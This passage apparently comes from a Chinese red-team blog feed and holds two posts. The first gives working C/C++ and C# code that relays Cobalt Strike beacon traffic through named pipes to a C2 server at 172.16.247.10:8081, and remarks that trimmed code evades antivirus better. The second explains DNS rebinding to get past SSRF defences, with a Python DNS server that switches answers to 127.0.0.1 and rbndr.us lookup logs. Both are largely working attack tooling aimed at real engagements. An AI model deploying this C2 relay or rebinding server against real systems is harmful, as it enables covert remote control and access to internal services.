OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	//检测管道和连接是否建立成功</span><br><span class="line">	if ((hPipeRead == INVALID_HANDLE_VALUE) || (hPipeWrite == INVALID_HANDLE_VALUE) || (hfileServer == INVALID_HANDLE_VALUE))</span><br><span class="line">	&#123;</span><br><span class="line">		if (hPipeRead == INVALID_HANDLE_VALUE)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;error during create readpipe.&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		if (hPipeWrite == INVALID_HANDLE_VALUE)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;error during create writepipe.&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		if (hfileServer == INVALID_HANDLE_VALUE)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;error during connect to beacon.&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;	</span><br><span class="line">		//一切正常</span><br><span class="line">		printf(&quot;all pipes are ok.\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	//放入客户端读管道和beacon连接</span><br><span class="line">	struct BRIDGE readbridge;</span><br><span class="line">	readbridge.client = hPipeRead;</span><br><span class="line">	readbridge.server = hfileServer;</span><br><span class="line">	//启动客户端读管道逻辑</span><br><span class="line">	HANDLE hTPipeRead = CreateThread(NULL, 0, ReadOnlyPipeProcess, (LPVOID)&amp; readbridge, 0, NULL);</span><br><span class="line">	</span><br><span class="line">	//放入客户端写管道和beacon连接</span><br><span class="line">	struct BRIDGE writebridge;</span><br><span class="line">	writebridge.client = hPipeWrite;</span><br><span class="line">	writebridge.server = hfileServer;</span><br><span class="line">	//启动客户端写管道逻辑</span><br><span class="line">	HANDLE hTPipeWrite = CreateThread(NULL, 0, WriteOnlyPipeProcess, (LPVOID)&amp; writebridge, 0, NULL);</span><br><span class="line"></span><br><span class="line">	//代码没有什么意义，直接写个死循环也行</span><br><span class="line">	HANDLE waitHandles[] = &#123; hPipeRead,hPipeWrite &#125;;</span><br><span class="line">	while (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		WaitForMultipleObjects(2, waitHandles, TRUE, INFINITE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="杂">杂</h2>
<h3 id="其它坑点">其它坑点</h3>
<p>php文件注意去BOM头%EF%BB%BF</p>
<h3 id="读写管道的cpp代码">读写管道的cpp代码</h3>
<p>cobaltstrike 自己生成smb beacon，剥离掉第三方注入shellcode的功能。这么做的原因是实际情况中代码越短越不好杀。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">// ConsoleApplication2.cpp : This file contains the <span class="string">&#x27;main&#x27;</span> function. Program execution begins <span class="keyword">and</span> ends there.</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &quot;pch.h&quot;</span></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;WinSock2.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;ShellAPI.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;Shlobj.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pragma comment(lib,&quot;ws2_32.lib&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(lib,&quot;user32.lib&quot;)</span></span><br><span class="line"><span class="comment">#pragma comment(lib,&quot;Advapi32.lib&quot;)  </span></span><br><span class="line"><span class="comment">#pragma comment(lib,&quot;Shell32.lib&quot;)</span></span><br><span class="line"><span class="comment">#pragma warning(disable:4996)</span></span><br><span class="line"></span><br><span class="line">using std::cout;</span><br><span class="line">using std::endl;</span><br><span class="line">// Sends data to our C2 controller received <span class="keyword">from</span> our injected beacon</span><br><span class="line">void sendData(SOCKET sd, const char *data, DWORD <span class="built_in">len</span>) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Sends data to our C2 controller received from our injected beacon&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	char *buffer = (char *)malloc(<span class="built_in">len</span> + <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">if</span> (buffer == NULL)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	DWORD bytesWritten = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	*(DWORD *)buffer = <span class="built_in">len</span>;</span><br><span class="line">	memcpy(buffer + <span class="number">4</span>, data, <span class="built_in">len</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (totalLen &lt; <span class="built_in">len</span> + <span class="number">4</span>) &#123;</span><br><span class="line">		bytesWritten = send(sd, buffer + totalLen, <span class="built_in">len</span> + <span class="number">4</span> - totalLen, <span class="number">0</span>);</span><br><span class="line">		totalLen += bytesWritten;</span><br><span class="line">	&#125;</span><br><span class="line">	free(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Receives data <span class="keyword">from</span> our C2 controller to be relayed to the injected beacon</span><br><span class="line">char *recvData(SOCKET sd, DWORD *<span class="built_in">len</span>) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Receives data from our C2 controller to be relayed to the injected beacon&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	char *buffer;</span><br><span class="line">	DWORD bytesReceived = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	*<span class="built_in">len</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	recv(sd, (char *)<span class="built_in">len</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">	buffer = (char *)malloc(*<span class="built_in">len</span>);</span><br><span class="line">	<span class="keyword">if</span> (buffer == NULL)</span><br><span class="line">		<span class="keyword">return</span> NULL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (totalLen &lt; *<span class="built_in">len</span>) &#123;</span><br><span class="line">		bytesReceived = recv(sd, buffer + totalLen, *<span class="built_in">len</span> - totalLen, <span class="number">0</span>);</span><br><span class="line">		totalLen += bytesReceived;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Creates a new C2 controller connection <span class="keyword">for</span> relaying commands</span><br><span class="line">SOCKET createC2Socket(const char *addr, WORD port) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Creates a new C2 controller connection for relaying commands&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	WSADATA wsd;</span><br><span class="line">	SOCKET sd;</span><br><span class="line">	SOCKADDR_IN sin;</span><br><span class="line">	WSAStartup(<span class="number">0x0202</span>, &amp;wsd);</span><br><span class="line"></span><br><span class="line">	memset(&amp;sin, <span class="number">0</span>, sizeof(sin));</span><br><span class="line">	sin.sin_family = AF_INET;</span><br><span class="line">	sin.sin_port = htons(port);</span><br><span class="line">	sin.sin_addr.S_un.S_addr = inet_addr(addr);</span><br><span class="line"></span><br><span class="line">	sd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);</span><br><span class="line">	connect(sd, (SOCKADDR*)&amp;sin, sizeof(sin));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Connects to the name pipe spawned by the injected beacon</span><br><span class="line">HANDLE connectBeaconPipe(const char *pipeName) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Connects to the name pipe spawned by the injected beacon&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	HANDLE beaconPipe;</span><br><span class="line"></span><br><span class="line">	beaconPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, NULL, OPEN_EXISTING, NULL, NULL);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> beaconPipe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Receives data <span class="keyword">from</span> our injected beacon via a named pipe</span><br><span class="line">char *recvFromBeacon(HANDLE pipe, DWORD *<span class="built_in">len</span>) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Receives data from our injected beacon via a named pipe&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	char *buffer;</span><br><span class="line">	DWORD bytesRead = <span class="number">0</span>, totalLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	*<span class="built_in">len</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	ReadFile(pipe, <span class="built_in">len</span>, <span class="number">4</span>, &amp;bytesRead, NULL);</span><br><span class="line">	buffer = (char *)malloc(*<span class="built_in">len</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (totalLen &lt; *<span class="built_in">len</span>) &#123;</span><br><span class="line">		ReadFile(pipe, buffer + totalLen, *<span class="built_in">len</span> - totalLen, &amp;bytesRead, NULL);</span><br><span class="line">		totalLen += bytesRead;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Write data to our injected beacon via a named pipe</span><br><span class="line">void sendToBeacon(HANDLE pipe, const char *data, DWORD <span class="built_in">len</span>) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Write data to our injected beacon via a named pipe&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">	DWORD bytesWritten = <span class="number">0</span>;</span><br><span class="line">	WriteFile(pipe, &amp;<span class="built_in">len</span>, <span class="number">4</span>, &amp;bytesWritten, NULL);</span><br><span class="line">	WriteFile(pipe, data, <span class="built_in">len</span>, &amp;bytesWritten, NULL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">	DWORD payloadLen = <span class="number">0</span>;</span><br><span class="line">	char *payloadData = NULL;</span><br><span class="line">	HANDLE beaconPipe = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line">	// Create a connection back to our C2 controller</span><br><span class="line">	SOCKET c2socket = createC2Socket(<span class="string">&quot;172.16.247.10&quot;</span>, <span class="number">8081</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	// Loop until the pipe <span class="keyword">is</span> up <span class="keyword">and</span> ready to use</span><br><span class="line">	<span class="keyword">while</span> (beaconPipe == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Create our IPC pipe for talking to the C2 beacon&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">		// Create our IPC pipe <span class="keyword">for</span> talking to the C2 beacon</span><br><span class="line">		Sleep(<span class="number">500</span>);</span><br><span class="line">		beaconPipe = connectBeaconPipe(<span class="string">&quot;\\\\.\\pipe\\xpntest&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (true) &#123;</span><br><span class="line">		// Start the pipe dance</span><br><span class="line">		payloadData = recvFromBeacon(beaconPipe, &amp;payloadLen);</span><br><span class="line">		<span class="keyword">if</span> (payloadLen == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		sendData(c2socket, payloadData, payloadLen);</span><br><span class="line">		free(payloadData);</span><br><span class="line"></span><br><span class="line">		payloadData = recvData(c2socket, &amp;payloadLen);</span><br><span class="line">		<span class="keyword">if</span> (payloadLen == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		sendToBeacon(beaconPipe, payloadData, payloadLen);</span><br><span class="line">		free(payloadData);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="管道通信只能点对点">管道通信只能点对点</h2>
<p><img src="./1571909112088.png" alt="Alt text"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.IO.Pipes;</span><br><span class="line">using System.Threading;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApp1</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            //connect to beacon</span><br><span class="line">            NamedPipeClientStream pipeClient = new NamedPipeClientStream(&quot;\\\\.\\&quot;, &quot;xpntest&quot;, PipeDirection.InOut);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(&quot;[client] Attemping to connect to pipe...&quot;);</span><br><span class="line">            pipeClient.Connect();</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(&quot;[client] connected to pipe&quot;);</span><br><span class="line">            Console.WriteLine(&quot;[client] There are currently &#123;0&#125; pipe server instances open.&quot;, pipeClient.NumberOfServerInstances);</span><br><span class="line"></span><br><span class="line">            StreamWriter writer = new StreamWriter(pipeClient);</span><br><span class="line">            StreamReader reader = new StreamReader(pipeClient);</span><br><span class="line">            writer.AutoFlush = true;</span><br><span class="line"></span><br><span class="line">            //create pipe to write</span><br><span class="line">            NamedPipeServerStream pipeWriteServer1 = new NamedPipeServerStream(&quot;hlwrite&quot;, PipeDirection.InOut);</span><br><span class="line">            NamedPipeClientStream pipeWriteClient1 = new NamedPipeClientStream(&quot;\\\\.\\&quot;, &quot;hlwrite&quot;, PipeDirection.InOut);</span><br><span class="line">            pipeWriteClient1.Connect();</span><br><span class="line">            StreamWriter pipeWriteClientWriter = new StreamWriter(pipeWriteClient1);</span><br><span class="line">            pipeWriteClientWriter.AutoFlush = true;</span><br><span class="line">            //create pipe to read</span><br><span class="line">            NamedPipeServerStream pipeReadServer2 = new NamedPipeServerStream(&quot;hlread&quot;, PipeDirection.InOut);</span><br><span class="line">            NamedPipeClientStream pipeReadClient2 = new NamedPipeClientStream(&quot;\\\\.\\&quot;, &quot;hlread&quot;, PipeDirection.InOut);</span><br><span class="line">            pipeReadClient2.Connect();</span><br><span class="line">            StreamReader pipeReadClientReader = new StreamReader(pipeReadClient2);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(&quot;All pipes are ok.&quot;);</span><br><span class="line"></span><br><span class="line">            Thread readOnlyThread = new Thread(() =&gt; ReadOnlyPipeProcess(reader, pipeWriteClientWriter));</span><br><span class="line">            readOnlyThread.IsBackground = true;</span><br><span class="line">            readOnlyThread.Start();</span><br><span class="line"></span><br><span class="line">            Thread WriteOnlyThread = new Thread(() =&gt; WriteOnlyPipeProcess(pipeReadClientReader, writer));</span><br><span class="line">            WriteOnlyThread.IsBackground = true;</span><br><span class="line">            WriteOnlyThread.Start();</span><br><span class="line"></span><br><span class="line">            readOnlyThread.Join();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static uint read_frame(StreamReader reader, string buffer)</span><br><span class="line">        &#123;</span><br><span class="line">            //First, read size.</span><br><span class="line">            uint frame_size = 0;</span><br><span class="line">            int i = 0;</span><br><span class="line">            byte[] size = new byte[4];</span><br><span class="line">            for (i = 0; i &lt; 4; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                size[i] = (Byte)reader.Read();</span><br><span class="line">            &#125;</span><br><span class="line">            //Array.Reverse(size);</span><br><span class="line">            frame_size = BitConverter.ToUInt32(size, 0);</span><br><span class="line">            Console.WriteLine(&quot;read_frame length: &#123;0&#125;.&quot;, frame_size);</span><br><span class="line"></span><br><span class="line">            //Second, read data</span><br><span class="line">            byte[] data = new byte[frame_size];</span><br><span class="line">            for (i = 0; i &lt; frame_size; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                data[i] = (Byte)reader.Read();</span><br><span class="line">            &#125;</span><br><span class="line">            buffer = System.Text.Encoding.ASCII.GetString(data);</span><br><span class="line">            Console.WriteLine(&quot;The frame data is: &#123;0&#125;&quot;, buffer);</span><br><span class="line">            return frame_size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static void write_frame(StreamWriter writer, string buffer)</span><br><span class="line">        &#123;</span><br><span class="line">            //Get buffer size </span><br><span class="line">            int frame_size = buffer.Length;</span><br><span class="line">            int i;</span><br><span class="line">            Console.WriteLine(&quot;write_frame length: &#123;0&#125;.&quot;, frame_size);</span><br><span class="line">            byte[] size = BitConverter.GetBytes(frame_size);</span><br><span class="line">            //Array.Reverse(size);</span><br><span class="line"></span><br><span class="line">            //First, write size</span><br><span class="line">            for (i = 0; i &lt; size.Length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                writer.Write(size[0]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            //Second, write data</span><br><span class="line">            for (i = 0; i &lt; frame_size; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                writer.Write(buffer[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //read data from beacon and write into own pipe</span><br><span class="line">        public static void ReadOnlyPipeProcess(StreamReader reader, StreamWriter writer)</span><br><span class="line">        &#123;</span><br><span class="line">            string buffer = &quot;&quot;;</span><br><span class="line">            while (true)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(&quot;Client want read.&quot;);</span><br><span class="line">                uint length = read_frame(reader, buffer);</span><br><span class="line">                Console.WriteLine(&quot;Read from beacon &#123;0&#125;.&quot;, length);</span><br><span class="line">                write_frame(writer, buffer);</span><br><span class="line">                buffer = &quot;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //read data from own pipe and write into beacon</span><br><span class="line">        public static void WriteOnlyPipeProcess(StreamReader reader, StreamWriter writer)</span><br><span class="line">        &#123;</span><br><span class="line">            string buffer = &quot;&quot;;</span><br><span class="line">            while (true)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(&quot;Beacon want read.&quot;);</span><br><span class="line">                uint length = read_frame(reader, buffer);</span><br><span class="line">                Console.WriteLine(&quot;Write to beacon &#123;0&#125;.&quot;, length);</span><br><span class="line">                write_frame(writer, buffer);</span><br><span class="line">                buffer = &quot;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考">参考</h2>
<p><a href="http://www.jeyzhang.com/csharp-learning-notes-2-multithreading.html">C#学习笔记2：多线程</a><br>
<a href="https://www.cnblogs.com/HDK2016/p/9840989.html">解析C#中管道流的使用</a><br>
<a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.io.streamreader.read?redirectedfrom=MSDN&amp;view=netframework-4.8#System_IO_StreamReader_Read">StreamReader.Read Method</a><br>
<a href="https://www.codeproject.com/Articles/1199046/A-Csharp-Named-Pipe-Library-That-Supports-Multiple">A C# Named Pipe Library That Supports Multiple Clients</a><br>
<a href="https://github.com/meilidao12/DataBase2CiChuChen/tree/04e9d554a4429c861aec9b486fae2e9a2e58f260/CommunicationServers/Pipe">CommunicationServers/Pipe/</a></p>
]]></content>
      <categories>
        <category>redteam</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS rebinding</title>
    <url>/2018/01/28/DNS%20rebinding/</url>
    <content><![CDATA[<!-- 利用服务器两次解析同一域名的短暂间隙，更换域名背后的ip达到突破同源策略或过waf进行ssrf的目的。 -->
<!-- more -->
<h2 id="DNS-rebinding是啥">DNS rebinding是啥</h2>
<p>利用服务器两次解析同一域名的短暂间隙，更换域名背后的ip达到突破同源策略或过waf进行ssrf的目的。</p>
<p>举个例子一般，进行ssrf防御的模式如下。</p>
<p><img src="ssrf.jpg" alt="ssrf.jpg"></p>
<ol>
<li>获取到输入的URL，从该URL中提取host</li>
<li>对该host进行DNS解析，获取到解析的IP</li>
<li>检测该IP是否是合法的，比如是否是私有IP等</li>
<li>如果IP检测为合法的，则进入curl的阶段发包</li>
</ol>
<p>这样的逻辑是有问题的，因为第二次服务端完全可以不使用url就是使用已被检查过的ip。</p>
<p>诚如前面所说同一url被用了两次，所以完全可以将TTL调到一个非常小的值，让第一次通过url拿到的ip失效，然后在curl的时候服务端必须再进行一次dns解析拿到ip，而这个ip没有被检查，于是就可以为所欲为了。<strong>在ssrf里面就是第一次解析出外网ip，第二次解析出内网ip。</strong></p>
<h2 id="一个demo">一个demo</h2>
<p>要实现dns重绑定一个重要的条件就是将TTL调到接近0的数字，一般的域名服务商是不允许TTL那么低的。所以只有自己搭或者自己写一个dns服务器。这里选择使用fakedns做一个简单的实验初体验。</p>
<p>vi一个dns.conf写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A cl0und.site 12.34.56.78,127.0.0.1</span><br></pre></td></tr></table></figure>
<p>然后分别dig两次</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig @fakedns所在的ip cl0und.site</span><br></pre></td></tr></table></figure>
<p><img src="digdemo.jpg" alt="digdemo.jpg"></p>
<h2 id="完整复现">完整复现</h2>
<p>当然比赛或者实战里面是不可能自己任意指定dns服务器解析，所以必须自己配置dns记录。貌似阿里是可以配置ns记录的。我用的国外的域名服务商貌似比较坑设置nameserver那里不允许用ip。</p>
<p>不讲道理，纠结了半天最后在ip后面加xip.io绕过。</p>
<p><img src="ban.png" alt="ban.png"></p>
<p>nameserver更新的比较慢要半个小时左右。</p>
<p><img src="bypass.png" alt="bypass.png"></p>
<p>半个小时以后~<br>
<img src="dns1.jpg" alt="dns1.jpg"><br>
可以看到成功是成功了，但是ttl有300实战中应该是不可接受的。但是看源码的时候发现ttl设置的1,很迷</p>
<p>所以去网上偷了一个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line">record=&#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DynamicResolver</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_doDynamicResponse</span>(<span class="params">self, query</span>):</span><br><span class="line">        name = query.name.name</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">&quot;12.34.56.78&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span> name+<span class="string">&quot; ===&gt; &quot;</span>+ip</span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            <span class="built_in">type</span>=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b&#x27;%s&#x27;</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">self, query, timeout=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">return</span> defer.succeed(<span class="variable language_">self</span>._doDynamicResponse(query))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">&#x27;/etc/resolv.conf&#x27;</span>)]</span><br><span class="line">    )</span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>
<p>开始安装twisted库失败，安装之前要先装一下，备忘</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install build-essential autoconf libtool pkg-config python-opengl python-imaging python-pyrex python-pyside.qtopengl idle-python2.7 qt4-dev-tools qt4-designer libqtgui4 libqtcore4 libqt4-xml libqt4-test libqt4-script libqt4-network libqt4-dbus python-qt4 python-qt4-gl libgle3 python-dev</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install twisted==16.6.0</span><br><span class="line">pip install service-identity==16.0.0</span><br></pre></td></tr></table></figure>
<p>后来推断应该是操作的系统的锅，空白的那一次实际上是解析出东西了的。300秒貌似是操作系统强制的（？）。</p>
<p>但是实际上已经成功了，在kali和centos上测了一下都是这个结果。</p>
<p><img src="kali.jpg" alt="kali.jpg"></p>
<p><img src="centos.png" alt="centos.png"></p>
<h2 id="不稳定的偷懒方法">不稳定的偷懒方法</h2>
<h3 id="法一">法一</h3>
<p>这个方法不需要，有自己的域名和nameserver。因为有人已经帮大家实现了。只需要把想用的<a href="https://www.adobe.com/devnet/flashplayer/articles/fplayer9_security.html">ip转换成16进制</a>，比如想在<code>127.0.0.1</code> 和 <code>192.168.0.1</code>互换那么只需要，键入ip<code>7f000001.c0a80001.rbndr.us</code></p>
<p>然后就是看脸了。随机试了一轮</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 127.0.0.1</span><br><span class="line">[root@localhost redis]# host 7f000001.c0a80001.rbndr.us</span><br><span class="line">7f000001.c0a80001.rbndr.us has address 192.168.0.1</span><br></pre></td></tr></table></figure>
<h3 id="法二">法二</h3>
<p>在bendawang师傅的博客看到的自己设置两个A记录一个内网,一个外网。去装外网先返回内网后返回这个概率。</p>
<h2 id="参考">参考</h2>
